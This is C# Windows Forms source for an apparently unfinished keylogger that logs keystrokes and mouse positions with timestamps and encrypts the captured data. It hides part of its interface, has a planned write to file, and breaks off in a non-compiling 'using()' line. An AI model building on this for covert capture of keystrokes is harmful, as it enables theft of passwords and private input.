using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;


namespace KeyMouseCapture
{
	public partial class frmMain : Form
	{
		Timer tmr = new Timer();

		KeyLogging k = new KeyLogging();
		List<string> someText = new List<string>();
		
		List<SaveState> saveState = new List<SaveState>();
		MouseCapture mc = new MouseCapture();
		Point newP, OldP = new Point();
		Stopwatch time = new Stopwatch();
		//need a class for time a point a string 
		bool reachPoint = false;

		public frmMain()
		{
			InitializeComponent();
			tmr.Interval = 16;
			tmr.Tick += Tmr_Tick;

			tmr.Start();
			time.Start();
			lbFrmMain.Hide();
			//UNCOMMENT
			//this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			
			//TODO What is this\/
			//pnlHIDE.BackColor = Color.Transparent;

		}

		private void Tmr_Tick(object sender, EventArgs e)
		{
			//DELETE THIS
			//show();//shows what I am doing


			KeyLogging k = new KeyLogging();
			
			
			
			string l = k.LogKeys(); //keyboard click
			newP.X = OldP.X + Cursor.Position.X;//mouse posistion
			newP.Y = OldP.Y + Cursor.Position.Y;

			
			SaveState svstate = new SaveState(time.ElapsedMilliseconds, l, newP);
			saveState.Add(svstate);

			//TODO:Create an auto escape to compinsate for size.
			//Over time there will be alot of string characters this will kill the string variable
			//I need to "reset this tmr and invoke everything so that I dont go over any 
			//limits of the string.

						
			
			 rtDiag.AppendText(l + " " + KeyLogging.SendAssNum() + "\n");
			//condition to exit the program to show form/hide panel
			if (l != "")
			{	
				//NEED FOR HUMAN READABILITY SEE: Region "makes keyboard input human readable"
				someText.Add(l);
				//lbFrmMain.Items.Add(l + " " + KeyLogging.SendAssNum()); //shows all key inputs being added to the items.
				
				if (l == "0")//condition to end program
				{
					reachPoint = true;
				}
			}
			if(reachPoint)//condition for stopping timers/recording input.
			{
				tmr.Stop();
				//show();
				time.Stop();
				time.Reset();

			
#region	makes keyboard input human readable
				/*
				string temp ="";
				List<string> smartTemp = new List<string>();
				foreach(string t in someText)
				{
					//temp += s;
					if (t != "Space")
					{
						if (!t.Contains("ShiftKey"))
						{
							if (!t.Contains("RShiftKey"))
							{
								temp += t;
							}
						}
					}
					else
					{
						smartTemp.Add(temp + " ");
						temp = "";
					}
				}
				smartTemp.Add(temp);
				
				string gg = "";
				foreach(string i in smartTemp)
				{
					
					gg += i;	
				}
				gg = gg.Remove(gg.Length - 1);
				lbFrmMain.Items.Add(gg);
				*/
#endregion
			   
				//foreach(SaveState ss in saveState)//will display everything
				//{
				//	lbFrmMain.Items.Add("Time: " + ss.time.ToString() +
				//						" X pos: " + ss.mousePosistion.X +
				//						" Ypos: " + ss.mousePosistion.Y +
				//						" keyPress: " + ss.keyBoardClick);
				//}
				string temp = Encrypt.GetEncData(saveState);//works, encrypts everything
				rtDiag.AppendText(temp);
				//TODO: record info to file.
				using()



			}
			

		}
		void show()
		{
			lbFrmMain.Show();
			pnlHIDE.Hide();
		}


	}
}
